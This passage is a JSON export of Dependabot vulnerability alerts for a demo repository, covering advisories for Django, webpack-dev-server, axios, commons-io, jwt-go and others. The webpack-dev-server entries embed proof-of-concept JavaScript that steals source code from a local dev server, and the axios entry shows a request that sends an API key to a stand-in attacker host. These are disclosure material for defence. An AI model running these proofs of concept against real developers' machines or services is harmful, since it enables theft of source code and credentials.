            "cwe_id": "CWE-522",
            "name": "Insufficiently Protected Credentials"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "pip",
          "name": "requests"
        },
        "severity": "medium",
        "vulnerable_version_range": "< 2.32.4",
        "first_patched_version": {
          "identifier": "2.32.4"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/172",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/172",
      "created_at": "2025-06-09T22:21:27Z",
      "updated_at": "2025-06-09T22:21:27Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 171,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "pip",
          "name": "Django"
        },
        "manifest_path": "authn-service/requirements.txt",
        "scope": "runtime",
        "relationship": "unknown"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-7xr5-9hcq-chf9",
        "cve_id": "CVE-2025-48432",
        "summary": "Django Improper Output Neutralization for Logs vulnerability",
        "description": "An issue was discovered in Django 5.2 before 5.2.2, 5.1 before 5.1.10, and 4.2 before 4.2.22. Internal HTTP response logging does not escape request.path, which allows remote attackers to potentially manipulate log output via crafted URLs. This may lead to log injection or forgery when logs are viewed in terminals or processed by external systems.",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-7xr5-9hcq-chf9",
            "type": "GHSA"
          },
          {
            "value": "CVE-2025-48432",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-48432"
          },
          {
            "url": "https://docs.djangoproject.com/en/dev/releases/security"
          },
          {
            "url": "https://groups.google.com/g/django-announce"
          },
          {
            "url": "https://www.djangoproject.com/weblog/2025/jun/04/security-releases"
          },
          {
            "url": "http://www.openwall.com/lists/oss-security/2025/06/04/5"
          },
          {
            "url": "https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2025-47.yaml"
          },
          {
            "url": "https://www.djangoproject.com/weblog/2025/jun/10/bugfix-releases"
          },
          {
            "url": "http://www.openwall.com/lists/oss-security/2025/06/10/2"
          },
          {
            "url": "http://www.openwall.com/lists/oss-security/2025/06/10/3"
          },
          {
            "url": "http://www.openwall.com/lists/oss-security/2025/06/10/4"
          },
          {
            "url": "https://github.com/advisories/GHSA-7xr5-9hcq-chf9"
          }
        ],
        "published_at": "2025-06-05T03:30:58Z",
        "updated_at": "2025-06-10T20:03:55Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "pip",
              "name": "Django"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 5.2, < 5.2.2",
            "first_patched_version": {
              "identifier": "5.2.2"
            }
          },
          {
            "package": {
              "ecosystem": "pip",
              "name": "Django"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 5.0a1, < 5.1.10",
            "first_patched_version": {
              "identifier": "5.1.10"
            }
          },
          {
            "package": {
              "ecosystem": "pip",
              "name": "Django"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 4.2.22",
            "first_patched_version": {
              "identifier": "4.2.22"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N",
            "score": 4.0
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00053,
          "percentile": 0.16509
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N",
          "score": 4.0
        },
        "cwes": [
          {
            "cwe_id": "CWE-117",
            "name": "Improper Output Neutralization for Logs"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "pip",
          "name": "Django"
        },
        "severity": "medium",
        "vulnerable_version_range": "< 4.2.22",
        "first_patched_version": {
          "identifier": "4.2.22"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/171",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/171",
      "created_at": "2025-06-06T17:34:58Z",
      "updated_at": "2025-06-06T17:34:58Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 170,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "webpack-dev-server"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-4v9v-hfq4-rm2v",
        "cve_id": "CVE-2025-30359",
        "summary": "webpack-dev-server users' source code may be stolen when they access a malicious web site",
        "description": "### Summary\nSource code may be stolen when you access a malicious web site.\n\n### Details\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18426585/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/`\n5. You can see the source code output in the document and the devtools console.\n\n![image](https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)\n\nThe script in the POC site is:\n```js\nlet moduleList\nconst onHandlerSet = (handler) => {\n  console.log('h', handler)\n  moduleList = handler.require.m\n}\n\nconst originalArrayForEach = Array.prototype.forEach\nArray.prototype.forEach = function forEach(callback, thisArg) {\n  callback((handler) => {\n    onHandlerSet(handler)\n  })\n  originalArrayForEach.call(this, callback, thisArg)\n  Array.prototype.forEach = originalArrayForEach\n}\n\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n  console.log(moduleList)\n  for (const key in moduleList) {\n    const p = document.createElement('p')\n    const title = document.createElement('strong')\n    title.textContent = key\n    const code = document.createElement('code')\n    code.textContent = moduleList[key].toString()\n    p.append(title, ':', document.createElement('br'), code)\n    document.body.appendChild(p)\n  }\n})\ndocument.head.appendChild(script)\n```\n\nThis script uses the function generated by [`renderRequire`](https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383).\n```js\n    // The require function\n    function __webpack_require__(moduleId) {\n        // Check if module is in cache\n        var cachedModule = __webpack_module_cache__[moduleId];\n        if (cachedModule !== undefined) {\n            return cachedModule.exports;\n        }\n        // Create a new module (and put it into the cache)\n        var module = __webpack_module_cache__[moduleId] = {\n            // no module.id needed\n            // no module.loaded needed\n            exports: {}\n        };\n        // Execute the module function\n        var execOptions = {\n            id: moduleId,\n            module: module,\n            factory: __webpack_modules__[moduleId],\n            require: __webpack_require__\n        };\n        __webpack_require__.i.forEach(function(handler) {\n            handler(execOptions);\n        });\n        module = execOptions.module;\n        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);\n        // Return the exports of the module\n        return module.exports;\n    }\n```\nEspecially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`.\nIt uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.\n\n<details>\n<summary>Old content</summary>\n\n### Summary\nSource code may be stolen when you use [`output.iife: false`](https://webpack.js.org/configuration/output/#outputiife) and access a malicious web site.\n\n### Details\nWhen `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`).\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\nI pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18409777/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/`\n5. Open the devtools console.\n6. You can see the content of `src/index.js` and other scripts loaded.\n\n![image](https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436)\n\nThe script in the POC site is:\n```js\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n    for (const module in window.__webpack_modules__) {\n        console.log(`${module}:`, window.__webpack_modules__[module].toString())\n    }\n})\ndocument.head.appendChild(script)\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.\n\n</details>",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-4v9v-hfq4-rm2v",
            "type": "GHSA"
          },
          {
            "value": "CVE-2025-30359",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30359"
          },
          {
            "url": "https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e"
          },
          {
            "url": "https://github.com/advisories/GHSA-4v9v-hfq4-rm2v"
          }
        ],
        "published_at": "2025-06-04T21:09:13Z",
        "updated_at": "2025-06-04T21:09:13Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "webpack-dev-server"
            },
            "severity": "medium",
            "vulnerable_version_range": "<= 5.2.0",
            "first_patched_version": {
              "identifier": "5.2.1"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
            "score": 5.3
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00033,
          "percentile": 0.08088
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
          "score": 5.3
        },
        "cwes": [
          {
            "cwe_id": "CWE-749",
            "name": "Exposed Dangerous Method or Function"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "webpack-dev-server"
        },
        "severity": "medium",
        "vulnerable_version_range": "<= 5.2.0",
        "first_patched_version": {
          "identifier": "5.2.1"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/170",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/170",
      "created_at": "2025-06-05T19:54:31Z",
      "updated_at": "2025-06-05T19:54:31Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 169,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "webpack-dev-server"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-9jgg-88mc-972h",
        "cve_id": "CVE-2025-30360",
        "summary": "webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser",
        "description": "### Summary\nSource code may be stolen when you access a malicious web site with non-Chromium based browser.\n\n### Details\nThe `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.\nBut webpack-dev-server always allows IP address `Origin` headers.\nhttps://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\nThis allows websites that are served on IP addresses to connect WebSocket.\nBy using the same method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.\n\nrelated commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.\n\nThis vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `http://{ipaddress}/?target=http://localhost:8080&file=main` with a non-Chromium browser (I used Firefox 134.0.1)\n5. Edit `src/index.js` in the extracted directory\n6. You can see the content of `src/index.js`\n\n![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)\n\nThe script in the POC site is:\n```js\nwindow.webpackHotUpdate = (...args) => {\n    console.log(...args);\n    for (i in args[1]) {\n        document.body.innerText = args[1][i].toString() + document.body.innerText\n\t    console.log(args[1][i])\n    }\n}\n\nlet params = new URLSearchParams(window.location.search);\nlet target = new URL(params.get('target') || 'http://127.0.0.1:8080');\nlet file = params.get('file')\nlet wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';\nlet wsPort = target.port;\nvar currentHash = '';\nvar currentHash2 = '';\nlet wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;\nws = new WebSocket(wsTarget);\nws.onmessage = event => {\n    console.log(event.data);\n    if (event.data.match('\"type\":\"ok\"')) {\n        s = document.createElement('script');\n        s.src = `${target}${file}.${currentHash2}.hot-update.js`;\n        document.body.appendChild(s)\n    }\n    r = event.data.match(/\"([0-9a-f]{20})\"/);\n    if (r !== null) {\n        currentHash2 = currentHash;\n        currentHash = r[1];\n        console.log(currentHash, currentHash2);\n    }\n}\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-9jgg-88mc-972h",
            "type": "GHSA"
          },
          {
            "value": "CVE-2025-30360",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30360"
          },
          {
            "url": "https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb"
          },
          {
            "url": "https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239"
          },
          {
            "url": "https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127"
          },
          {
            "url": "https://github.com/advisories/GHSA-9jgg-88mc-972h"
          }
        ],
        "published_at": "2025-06-04T21:09:38Z",
        "updated_at": "2025-06-04T21:09:39Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "webpack-dev-server"
            },
            "severity": "medium",
            "vulnerable_version_range": "<= 5.2.0",
            "first_patched_version": {
              "identifier": "5.2.1"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
            "score": 6.5
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00017,
          "percentile": 0.02456
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
          "score": 6.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-346",
            "name": "Origin Validation Error"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "webpack-dev-server"
        },
        "severity": "medium",
        "vulnerable_version_range": "<= 5.2.0",
        "first_patched_version": {
          "identifier": "5.2.1"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/169",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/169",
      "created_at": "2025-06-05T19:54:30Z",
      "updated_at": "2025-06-05T19:54:30Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 168,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "maven",
          "name": "commons-io:commons-io"
        },
        "manifest_path": "storage-service/pom.xml",
        "scope": "runtime",
        "relationship": "unknown"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-78wr-2p64-hpwj",
        "cve_id": "CVE-2024-47554",
        "summary": "Apache Commons IO: Possible denial of service attack on untrusted input to XmlStreamReader",
        "description": "Uncontrolled Resource Consumption vulnerability in Apache Commons IO.\n\nThe `org.apache.commons.io.input.XmlStreamReader` class may excessively consume CPU resources when processing maliciously crafted input.\n\n\nThis issue affects Apache Commons IO: from 2.0 before 2.14.0.\n\nUsers are recommended to upgrade to version 2.14.0 or later, which fixes the issue.",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-78wr-2p64-hpwj",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-47554",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47554"
          },
          {
            "url": "https://lists.apache.org/thread/6ozr91rr9cj5lm0zyhv30bsp317hk5z1"
          },
          {
            "url": "http://www.openwall.com/lists/oss-security/2024/10/03/2"
          },
          {
            "url": "https://security.netapp.com/advisory/ntap-20250131-0010"
          },
          {
            "url": "https://github.com/advisories/GHSA-78wr-2p64-hpwj"
          }
        ],
        "published_at": "2024-10-03T12:30:48Z",
        "updated_at": "2025-01-31T15:30:43Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "maven",
              "name": "commons-io:commons-io"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 2.0, < 2.14.0",
            "first_patched_version": {
              "identifier": "2.14.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 7.5
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
            "score": 8.7
          }
        },
        "epss": {
          "percentage": 0.00039,
          "percentile": 0.11207
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 7.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-400",
            "name": "Uncontrolled Resource Consumption"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "maven",
          "name": "commons-io:commons-io"
        },
        "severity": "high",
        "vulnerable_version_range": ">= 2.0, < 2.14.0",
        "first_patched_version": {
          "identifier": "2.14.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/168",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/168",
      "created_at": "2025-06-02T13:38:22Z",
      "updated_at": "2025-06-02T13:38:22Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 167,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "go",
          "name": "github.com/dgrijalva/jwt-go"
        },
        "manifest_path": "gallery-service/go.mod",
        "scope": "runtime",
        "relationship": "unknown"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-w73w-5m7g-f7qc",
        "cve_id": "CVE-2020-26160",
        "summary": "Authorization bypass in github.com/dgrijalva/jwt-go",
        "description": "jwt-go allows attackers to bypass intended access restrictions in situations with `[]string{}` for `m[\"aud\"]` (which is allowed by the specification). Because the type assertion fails, \"\" is the value of aud. This is a security problem if the JWT token is presented to a service that lacks its own audience check. There is no patch available and users of jwt-go are advised to migrate to [golang-jwt](https://github.com/golang-jwt/jwt) at version 3.2.1",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-w73w-5m7g-f7qc",
            "type": "GHSA"
          },
          {
            "value": "CVE-2020-26160",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26160"
          },
          {
            "url": "https://github.com/dgrijalva/jwt-go/issues/422"
          },
          {
            "url": "https://github.com/dgrijalva/jwt-go/pull/426"
          },
          {
            "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMDGRIJALVAJWTGO-596515"
          },
          {
            "url": "https://github.com/dgrijalva/jwt-go/issues/462"
          },
          {
            "url": "https://github.com/dgrijalva/jwt-go/commit/ec0a89a131e3e8567adcb21254a5cd20a70ea4ab"
          },
          {
            "url": "https://pkg.go.dev/vuln/GO-2020-0017"
          },
          {
            "url": "https://github.com/advisories/GHSA-w73w-5m7g-f7qc"
          }
        ],
        "published_at": "2021-05-18T21:08:21Z",
        "updated_at": "2024-05-20T19:26:27Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "go",
              "name": "github.com/dgrijalva/jwt-go/v4"
            },
            "severity": "high",
            "vulnerable_version_range": "< 4.0.0-preview1",
            "first_patched_version": {
              "identifier": "4.0.0-preview1"
            }
          },
          {
            "package": {
              "ecosystem": "go",
              "name": "github.com/dgrijalva/jwt-go"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 0.0.0-20150717181359-44718f8a89b0, <= 3.2.0",
            "first_patched_version": null
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "score": 7.5
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00045,
          "percentile": 0.13654
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
          "score": 7.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-287",
            "name": "Improper Authentication"
          },
          {
            "cwe_id": "CWE-755",
            "name": "Improper Handling of Exceptional Conditions"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "go",
          "name": "github.com/dgrijalva/jwt-go"
        },
        "severity": "high",
        "vulnerable_version_range": ">= 0.0.0-20150717181359-44718f8a89b0, <= 3.2.0",
        "first_patched_version": null
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/167",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/167",
      "created_at": "2025-06-02T13:38:22Z",
      "updated_at": "2025-06-02T13:38:22Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 166,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "axios"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-jr5f-v2jv-69x6",
        "cve_id": "CVE-2025-27152",
        "summary": "axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
        "description": "### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).\nReference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-jr5f-v2jv-69x6",
            "type": "GHSA"
          },
          {
            "value": "CVE-2025-27152",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6"
          },
          {
            "url": "https://github.com/axios/axios/issues/6463"
          },
          {
            "url": "https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f"
          },
          {
            "url": "https://github.com/axios/axios/releases/tag/v1.8.2"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-27152"
          },
          {
            "url": "https://github.com/axios/axios/pull/6829"
          },
          {
            "url": "https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde"
          },
          {
            "url": "https://github.com/advisories/GHSA-jr5f-v2jv-69x6"
          }
        ],
        "published_at": "2025-03-07T15:16:00Z",
        "updated_at": "2025-03-28T14:57:53Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "axios"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 1.0.0, < 1.8.2",
            "first_patched_version": {
              "identifier": "1.8.2"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "axios"
            },
            "severity": "high",
            "vulnerable_version_range": "< 0.30.0",
            "first_patched_version": {
              "identifier": "0.30.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": null,
            "score": 0.0
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P",
            "score": 7.7
          }
        },
        "epss": {
          "percentage": 0.00021,
          "percentile": 0.03896
        },
        "cvss": {
          "vector_string": null,
          "score": 0.0
        },
        "cwes": [
          {
            "cwe_id": "CWE-918",
            "name": "Server-Side Request Forgery (SSRF)"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "axios"
        },
        "severity": "high",
        "vulnerable_version_range": "< 0.30.0",
        "first_patched_version": {
          "identifier": "0.30.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/166",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/166",
      "created_at": "2025-06-02T13:38:22Z",
      "updated_at": "2025-06-02T13:38:22Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 165,
      "state": "auto_dismissed",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "@babel/runtime"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-968p-4wvh-cqc8",
        "cve_id": "CVE-2025-27789",
        "summary": "Babel has inefficient RegExp complexity in generated code with .replace when transpiling named capturing groups",
